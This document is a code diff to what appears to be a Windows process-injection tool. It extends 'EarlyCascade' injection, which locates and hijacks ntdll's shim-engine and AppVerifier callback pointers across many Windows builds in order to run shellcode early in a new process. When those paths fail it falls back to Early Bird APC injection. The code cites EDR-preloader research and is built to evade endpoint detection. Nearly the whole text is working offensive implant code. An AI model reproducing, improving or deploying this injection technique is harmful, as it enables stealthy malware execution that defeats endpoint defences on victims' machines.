@@ -3672,7 +3672,7 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress);
 LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress);
 
 // AppVerifier fallback (from MalwareTech EDR-Preloader research)
-ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase);
+ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase, DWORD mrdataSize);
 ULONG_PTR GetNtdllSectionBase(ULONG_PTR baseAddress, const char* name);
 
 // Pointer encoding using SharedUserData!Cookie
@@ -3723,6 +3723,10 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx);
 
 #ifndef ENABLE_CMDLINE_SPOOF
 #define ENABLE_CMDLINE_SPOOF 0
+#endif
+
+#ifndef LOG_ERROR
+#define LOG_ERROR(fmt, ...)
 #endif
 
 // ============================================================================
@@ -3777,7 +3781,8 @@ static DWORD GetNtdllSectionSize(ULONG_PTR baseAddress, const char* name) {
 
 // ============================================================================
 // FindSE_DllLoadedAddress
-// Scans ntdll .text for the pattern that references g_pfnSE_DllLoaded
+// Scans ntdll .text for patterns referencing g_pfnSE_DllLoaded across all
+// Windows versions (multi-pattern + RIP-relative scan + .mrdata walk tiers).
 // ============================================================================
 
 LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
@@ -3790,29 +3795,87 @@ LPVOID FindSE_DllLoadedAddress(LPVOID hNtDLL, LPVOID *ppOffsetAddress) {
     if (!textBase || !textSize || !mrdataBase || !mrdataSize)
         return NULL;
 
-    // Pattern: mov edx,[gs:330h]; mov eax,edx; mov rdi,[rel g_pfnSE_DllLoaded]
-    BYTE pattern[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
-                       0x8B, 0xC2, 0x48, 0x8B, 0x3D };
-    LPBYTE pFound = (LPBYTE)FindPattern((LPBYTE)textBase, textSize,
-                                         pattern, sizeof(pattern));
-    if (!pFound)
-        return NULL;
+    // -----------------------------------------------------------------------
+    // Tier 1: Multiple byte patterns for g_pfnSE_DllLoaded across Windows builds
+    // Each entry is the bytes before the 4-byte RIP-relative offset.
+    // -----------------------------------------------------------------------
+    // Win10 21H2 / 22H2: mov edx,[gs:330h]; mov eax,edx; mov rdi,[rel ...]
+    static BYTE pat1[] = { 0x8B, 0x14, 0x25, 0x30, 0x03, 0xFE, 0x7F,
+                           0x8B, 0xC2, 0x48, 0x8B, 0x3D };
+    // Win10 1909 / 2004: mov rax,[rel ...]
+    static BYTE pat2[] = { 0x48, 0x8B, 0x05 };
+    // Win11 22H2 / 23H2 / 24H2: mov rdi,[rel ...]
+    static BYTE pat3[] = { 0x48, 0x8B, 0x3D };
+    // Win11 build 26100+: mov r13,[rel ...]
+    static BYTE pat4[] = { 0x4C, 0x8B, 0x2D };
 
-    // The RIP-relative offset is 4 bytes after the last byte of the pattern
-    // Instruction: 48 8B 3D <offset32>  -> next instr at pFound+12+4
-    LPBYTE pOffsetPtr = pFound + sizeof(pattern);
-    INT32  relOffset  = *(INT32*)pOffsetPtr;
-    LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
+    struct { LPBYTE pat; DWORD len; } patterns[] = {
+        { pat1, sizeof(pat1) },
+        { pat2, sizeof(pat2) },
+        { pat3, sizeof(pat3) },
+        { pat4, sizeof(pat4) },
+    };
 
-    // Validate: must fall within .mrdata
-    if ((ULONG_PTR)pResolved < mrdataBase ||
-        (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
-        return NULL;
+    for (int p = 0; p < 4; p++) {
+        LPBYTE pFound = (LPBYTE)FindPattern((LPBYTE)textBase, textSize,
+                                            patterns[p].pat, patterns[p].len);
+        if (!pFound)
+            continue;
+        LPBYTE pOffsetPtr = pFound + patterns[p].len;
+        INT32  relOffset  = *(INT32*)pOffsetPtr;
+        LPVOID pResolved  = (LPVOID)(pOffsetPtr + 4 + relOffset);
+        if ((ULONG_PTR)pResolved < mrdataBase ||
+            (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
+            continue;
+        if (ppOffsetAddress)
+            *ppOffsetAddress = pOffsetPtr;
+        return pResolved;
+    }
 
-    if (ppOffsetAddress)
-        *ppOffsetAddress = pOffsetPtr;
+    // -----------------------------------------------------------------------
+    // Tier 2: RIP-relative scan — find any 48/4C 8B xx instruction in .text
+    // whose resolved address falls within .mrdata; pick the first 8-byte-
+    // aligned slot that is NULL or points into .text (function-pointer slot).
+    // -----------------------------------------------------------------------
+    for (DWORD i = 0; i + 7 < textSize; i++) {
+        LPBYTE pb = (LPBYTE)(textBase + i);
+        // Match: 48 8B ?? or 4C 8B ?? (3-byte prefix + 4-byte offset)
+        if ((pb[0] == 0x48 || pb[0] == 0x4C) && pb[1] == 0x8B) {
+            LPBYTE pOffsetPtr = pb + 3;
+            INT32  relOffset = *(INT32*)pOffsetPtr;
+            LPVOID pResolved = (LPVOID)(pOffsetPtr + 4 + relOffset);
+            if ((ULONG_PTR)pResolved < mrdataBase ||
+                (ULONG_PTR)pResolved >= mrdataBase + mrdataSize)
+                continue;
+            if (((ULONG_PTR)pResolved & 7) != 0)
+                continue;
+            ULONG_PTR slotVal = *(ULONG_PTR*)pResolved;
+            if (slotVal == 0 ||
+                (slotVal >= textBase && slotVal < textBase + textSize)) {
+                if (ppOffsetAddress)
+                    *ppOffsetAddress = pOffsetPtr;
+                return pResolved;
+            }
+        }
+    }
 
-    return pResolved;
+    // -----------------------------------------------------------------------
+    // Tier 3: Direct .mrdata walk — first 8-byte-aligned slot near the start
+    // of .mrdata that is NULL or points into .text.
+    // No corresponding .text instruction pointer; caller cannot use ShimsEnabled.
+    // -----------------------------------------------------------------------
+    DWORD scanLimit = (mrdataSize < 0x200) ? mrdataSize : 0x200;
+    for (DWORD off = 0; off + sizeof(ULONG_PTR) <= scanLimit; off += sizeof(ULONG_PTR)) {
+        ULONG_PTR slotVal = *(ULONG_PTR*)(mrdataBase + off);
+        if (slotVal == 0 ||
+            (slotVal >= textBase && slotVal < textBase + textSize)) {
+            if (ppOffsetAddress)
+                *ppOffsetAddress = NULL;
+            return (LPVOID)(mrdataBase + off);
+        }
+    }
+
+    return NULL;
 }
 
 // ============================================================================
@@ -3858,36 +3921,29 @@ LPVOID FindShimsEnabledAddress(LPVOID hNtDLL, LPVOID pDllLoadedOffsetAddress) {
 
 // ============================================================================
 // FindAvrfpAddress - MalwareTech AppVerifier fallback
+// Full scan of .mrdata (no fixed offset) for LdrpMrdataBase self-pointer.
 // ============================================================================
 
-ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase) {
-    if (!mrdataBase)
+ULONG_PTR FindAvrfpAddress(ULONG_PTR mrdataBase, DWORD mrdataSize) {
+    if (!mrdataBase || !mrdataSize)
         return 0;
 
-    // Search from base+0x280 for a pointer whose value equals mrdataBase
-    // (that's LdrpMrdataBase)
-    ULONG_PTR scanAddr = mrdataBase + 0x280;
-    ULONG_PTR scanEnd  = mrdataBase + 0x2000;
-
-    ULONG_PTR* pLdrpMrdataBase = NULL;
-    for (ULONG_PTR addr = scanAddr; addr < scanEnd; addr += sizeof(ULONG_PTR)) {
+    // Scan ALL of .mrdata for a pointer whose value equals mrdataBase
+    // (that's LdrpMrdataBase self-pointer)
+    for (ULONG_PTR addr = mrdataBase;
+         addr + sizeof(ULONG_PTR) <= mrdataBase + mrdataSize;
+         addr += sizeof(ULONG_PTR)) {
         if (*(ULONG_PTR*)addr == mrdataBase) {
-            pLdrpMrdataBase = (ULONG_PTR*)addr;
-            break;
+            // Found LdrpMrdataBase — AvrfpAPILookupCallbackRoutine is 2 pointers after
+            ULONG_PTR* pAvrfp = (ULONG_PTR*)addr + 2;
+            // Validate: must still be within .mrdata section bounds
+            if ((ULONG_PTR)pAvrfp < mrdataBase ||
+                (ULONG_PTR)pAvrfp >= mrdataBase + mrdataSize)
+                return 0;
+            return (ULONG_PTR)pAvrfp;
         }
     }
-    if (!pLdrpMrdataBase)
-        return 0;
-
-    // AvrfpAPILookupCallbackRoutine is 2 pointers (0x10 bytes) after LdrpMrdataBase on x64
-    // This is a known fixed layout from MalwareTech EDR-Preloader research
-    ULONG_PTR* pAvrfp = pLdrpMrdataBase + 2;
-
-    // Validate: must still be within .mrdata section bounds
-    if ((ULONG_PTR)pAvrfp < mrdataBase || (ULONG_PTR)pAvrfp >= mrdataBase + 0x4000)
-        return 0;
-
-    return (ULONG_PTR)pAvrfp;
+    return 0;
 }
 
 // ============================================================================
@@ -4142,7 +4198,11 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
             printf("[+] EarlyCascade: ShimEngine path found (SE_DllLoaded=%p, ShimsEnabled=%p)\n",
                    pCallbackAddr, pShimsEnabledAddr);
 #endif
+        } else {
+            LOG_ERROR("EarlyCascade: FindShimsEnabledAddress failed after SE_DllLoaded found");
         }
+    } else {
+        LOG_ERROR("EarlyCascade: FindSE_DllLoadedAddress failed, trying AvrfpAPILookup fallback");
     }
 
     // Fallback: AppVerifier path
@@ -4150,23 +4210,26 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     if (!bShimPath) {
         ULONG_PTR base       = (ULONG_PTR)hNtDLL;
         ULONG_PTR mrdataBase = GetNtdllSectionBase(base, ".mrdata");
+        DWORD     mrdataSize = GetNtdllSectionSize(base, ".mrdata");
         if (mrdataBase) {
-            ULONG_PTR avrfAddr = FindAvrfpAddress(mrdataBase);
+            ULONG_PTR avrfAddr = FindAvrfpAddress(mrdataBase, mrdataSize);
             if (avrfAddr) {
                 pCallbackAddr = (LPVOID)avrfAddr;
                 bAvrfPath     = TRUE;
 #if DEBUG_BUILD
                 printf("[+] EarlyCascade: AppVerifier fallback path (Avrfp=%p)\n", pCallbackAddr);
 #endif
+            } else {
+                LOG_ERROR("EarlyCascade: FindAvrfpAddress failed");
             }
+        } else {
+            LOG_ERROR("EarlyCascade: GetNtdllSectionBase(.mrdata) failed");
         }
     }
 
     // Last resort: fall back to standard Early Bird APC
     if (!bShimPath && !bAvrfPath) {
-#if DEBUG_BUILD
-        printf("[!] EarlyCascade: All cascade paths failed, falling back to Early Bird APC\n");
-#endif
+        LOG_ERROR("EarlyCascade: All cascade paths failed, falling back to Early Bird APC");
         return InjectEarlyBird(pCtx);
     }
 
@@ -4180,6 +4243,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
         pi.hProcess, &pRemoteBuf, 0, &allocSize,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (status != 0 || !pRemoteBuf) {
+        LOG_ERROR("EarlyCascade: NtAllocateVirtualMemory failed");
 #if DEBUG_BUILD
         printf("[!] EarlyCascade: NtAllocateVirtualMemory failed: 0x%08X\n", status);
 #endif
@@ -4198,6 +4262,7 @@ BOOL InjectEarlyCascade(PINJECTION_CONTEXT pCtx) {
     // Verify stub placeholder offsets before patching (catch any future stub edits)
     if (*(ULONGLONG*)(g_EarlyCascadeStub + STUB_SHIMSENA_OFFSET) != 0x1111111111111111ULL ||
         *(ULONGLONG*)(g_EarlyCascadeStub + STUB_SHELLCODE_OFFSET) != 0x2222222222222222ULL) {
+        LOG_ERROR("EarlyCascade: Stub placeholder offsets are wrong! Aborting.");
 #if DEBUG_BUILD
         printf("[!] EarlyCascade: Stub placeholder offsets are wrong! Aborting.\n");
 #endif
